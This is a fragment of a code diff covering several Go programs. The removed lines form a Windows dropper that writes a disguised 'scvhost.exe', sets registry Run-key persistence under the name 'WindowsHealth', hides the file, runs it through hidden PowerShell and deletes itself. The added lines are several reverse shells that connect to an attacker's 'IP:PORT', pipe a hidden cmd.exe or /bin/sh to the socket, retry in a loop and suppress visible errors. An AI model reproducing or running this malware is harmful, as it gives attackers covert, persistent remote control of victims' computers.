+        fmt.Println("Unsupported OS")
+        os.Exit(1)
     }
-}
-
-func Popen(command string, args ...interface{}) {
-    cmd := fmt.Sprintf(command, args...)
-    process := exec.Command(shell, flag, cmd)
-    process.Stdin = os.Stdin
-    process.Stdout = os.Stdout
-    process.Stderr = os.Stderr
-    err := process.Run()
-    if err != nil {
-        fmt.Fprintf(os.Stderr, "Error executing command: %v\n", err)
-    }
-}
-
-func setRegistryPersistence(exePath string) {
-    Popen(`reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WindowsHealth /t REG_SZ /d "%s"`, exePath)
+    return "", nil
 }
 
 func main() {
-    encodedExeData := "africanas"
-    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
+    // Connect to the server
+    conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
     if err != nil {
-        fmt.Fprintf(os.Stderr, "Error decoding base64 data: %v\n", err)
-        return
+        fmt.Println("Error connecting to server:", err)
+        os.Exit(1)
     }
+    defer conn.Close()
 
-    exeOutputPath := `C:\Users\Public\Libraries\scvhost.exe`
-    err = os.WriteFile(exeOutputPath, exeData, 0644)
+    for {
+        // Print current working directory
+        cwd, _ := os.Getwd()
+        fmt.Fprintf(conn, "\n%s> ", cwd)
+
+        // Read command from server
+        msg, err := bufio.NewReader(conn).ReadString('\n')
+        if err != nil {
+            fmt.Println("Error reading from connection:", err)
+            return
+        }
+
+        // Execute the command
+        msg = strings.TrimSpace(msg) // Remove any trailing newline
+        exe, args := getArchMessageFormat(msg)
+        out, err := exec.Command(exe, args...).CombinedOutput()
+        if err != nil {
+            out = []byte(fmt.Sprintf("Error executing command: %v", err))
+        }
+
+        // Send command output back to server
+        fmt.Fprintf(conn, "%s\n", out)
+    }
+}
+
+
+
+
+package main
+
+import (
+    "net"
+    "os/exec"
+    "syscall"
+    "log"
+)
+
+func main() {
+    // Replace "IP:PORT" with the actual IP address and port of the listener
+    conn, err := net.Dial("tcp", "IP:PORT")
     if err != nil {
-        fmt.Fprintf(os.Stderr, "Error writing file: %v\n", err)
-        return
+        log.Fatalf("Failed to connect: %v", err)
     }
+    defer conn.Close()
 
-    setRegistryPersistence(exeOutputPath)
+    // Prepare the command to execute
+    cmd := exec.Command("cmd.exe") // Use "cmd.exe" for Windows
 
-    Popen(`attrib +h "%s"`, exeOutputPath)
-    Popen(`powershell -w 1 "%s"`, exeOutputPath)
+    // Hide the command prompt window
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    
+    // Redirect the command's I/O to the TCP connection
+    cmd.Stdin = conn
+    cmd.Stdout = conn
+    cmd.Stderr = conn
+
+    // Run the command
+    err = cmd.Run()
+    if err != nil {
+        log.Fatalf("Command execution failed: %v", err)
+    }
+}
+
+
+
+package main
+
+import (
+    "net"
+    "os/exec"
+    "syscall"
+)
+
+func main() {
+    c, _ := net.Dial("tcp", "IP:PORT")
+    cmd := exec.Command("cmd")
+    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+    cmd.Run()
+}
+
+func reverse(host string) {
+    for {
+        c, err := net.Dial("tcp", host)
+        if nil != err {
+            if nil != c {
+                c.Close()
+            }
+            time.Sleep(time.Minute)
+            reverse(host)
+        }
+
+        cmd := exec.Command("/bin/sh")
+        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+        cmd.Run()
+        c.Close()
+    }
 }
 
 
 package main
 
 import (
-    "encoding/base64"
-    "fmt"
+    "io"
+    "net"
     "os"
     "os/exec"
-    "runtime"
-    "path/filepath"
+    "syscall"
     "time"
 )
 
-var (
-    shell string
-    flag  string
-)
-
-func init() {
-    switch runtime.GOOS {
-    case "windows":
-        shell = "powershell"
-        flag = "-Command"
-    default:
-        shell = "bash"
-        flag = "-c"
-    }
-}
-
-func Popen(command string, args ...interface{}) {
-    cmd := fmt.Sprintf(command, args...)
-    process := exec.Command(shell, flag, cmd)
-    process.Stdin = os.Stdin
-    process.Stdout = os.Stdout
-    process.Stderr = os.Stderr
-    err := process.Run()
-    if err != nil {
-        fmt.Fprintf(os.Stderr, "Error executing command: %v\n", err)
-    }
-}
-
-func setRegistryPersistence(exePath string) {
-    Popen(`reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WindowsHealth /t REG_SZ /d "%s"`, exePath)
-}
-
-func createSelfDeleteScript() error {
-    exePath, err := os.Executable()
-    if err != nil {
-        return fmt.Errorf("error getting executable path: %v", err)
-    }
-    deleteScript := filepath.Join(filepath.Dir(exePath), "self_delete.ps1")
-    
-    scriptContent := fmt.Sprintf(`
-Start-Sleep -Seconds 5
-Remove-Item -Path "%s" -Force
-`, exePath)
-
-    return os.WriteFile(deleteScript, []byte(scriptContent), 0644)
-}
-
+// Entry point of the program
 func main() {
-    encodedExeData := "africanas"
-    exeData, err := base64.StdEncoding.DecodeString(encodedExeData)
+    serverAddress := "IP:PORT" // Replace with actual IP and port
+    err := reverse(serverAddress)
     if err != nil {
-        fmt.Fprintf(os.Stderr, "Error decoding base64 data: %v\n", err)
-        return
+        // Log the error to a file instead of displaying it to the console
+        logError(err)
     }
-
-    exeOutputPath := `C:\Users\Public\Libraries\scvhost.exe`
-    err = os.WriteFile(exeOutputPath, exeData, 0644)
-    if err != nil {
-        fmt.Fprintf(os.Stderr, "Error writing file: %v\n", err)
-        return
-    }
-
-    setRegistryPersistence(exeOutputPath)
-
-    Popen(`attrib +h "%s"`, exeOutputPath)
-    Popen(`powershell -w 1 "%s"`, exeOutputPath)
-
-    // Create self-delete script
-    if err := createSelfDeleteScript(); err != nil {
-        fmt.Fprintf(os.Stderr, "Error creating self-delete script: %v\n", err)
-        return
-    }
-
-    // Execute the self-delete script
-    Popen(`powershell -ExecutionPolicy Bypass -File "%s"`, filepath.Join(filepath.Dir(os.Args[0]), "self_delete.ps1"))
 }
+
+// Establish a reverse connection and execute a shell
+func reverse(host string) error {
+    for {
+        c, err := net.Dial("tcp", host)
+        if err != nil {
+            // Log the error and retry connection
+            logError(err)
+            time.Sleep(time.Minute)
+            continue
+        }
+        defer c.Close()
+
+        var cmd *exec.Cmd
+        if isWindows() {
+            cmd = exec.Command("cmd")
+            cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+        } else {
+            cmd = exec.Command("/bin/sh")
+        }
+
+        // Redirect all output to the network connection
+        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+        err = cmd.Run()
+        if err != nil {
+            logError(err)
+        }
+    }
+}
+
+// Check if the operating system is Windows
+func isWindows() bool {
+    return os.PathSeparator == '\\'
+}
+
+// Log errors to a file instead of displaying them
+func logError(err error) {
+    f, ferr := os.OpenFile("error.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+    if ferr != nil {
+        // If unable to open log file, just return
+        return
+    }
+    defer f.Close()
+
+    if _, ferr := io.WriteString(f, err.Error()+"\n"); ferr != nil {
+        // If unable to write to log file, just return
+        return
+    }
+}
+
